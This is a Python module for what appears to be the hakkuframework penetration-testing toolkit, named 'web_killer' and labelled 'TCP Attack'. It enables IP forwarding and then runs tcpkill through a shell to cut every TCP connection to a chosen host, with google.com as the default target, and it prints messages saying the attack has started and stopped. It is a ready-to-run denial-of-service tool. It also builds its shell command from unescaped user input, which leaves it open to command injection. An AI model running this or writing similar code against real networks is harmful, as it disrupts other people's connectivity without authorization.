#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)

import time
import os
import subprocess
import sys
from core import colors
from collections import OrderedDict

# Info about the module
#modules name
name = "web_killer"
#version
version = "1.0"
# Description
desc = "TCP Attack"
# Creator's github
github = "4shadoww"
#created by
createdby = "4shadoww"
# Email
email = "4shadoww0@gmail.com"

# List of the variables
variables = OrderedDict((
('interface', 'wlan0'),
('target', 'google.com'),

))

# Description for variables
vdesc = [
'network interface name',
'target address',
]

#simple changelog
changelog = "Version 1.0:\nrelease"



# Run
def run():
	variables['target'] = variables['target'].replace("http://", "")
	variables['target'] = variables['target'].replace("https://", "")
	print(colors.blue + "[*] IP Forwarding ..." + colors.end)
	subprocess.Popen('echo 1 > /proc/sys/net/ipv4/ip_forward', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	time.sleep(2)
	command_1 = 'tcpkill -i ' + variables['interface'] +' -9 host ' + variables['target']
	subprocess.Popen(command_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	line_3 = colors.green + "[*] Attack Has Been Started, For Stop Attack Press [enter] Key..." + colors.end
	press_ak = input(line_3)
	os.system('killall tcpkill')
	print(colors.bold + colors.blue + "[*] Attack Has Been Stoped." + colors.end)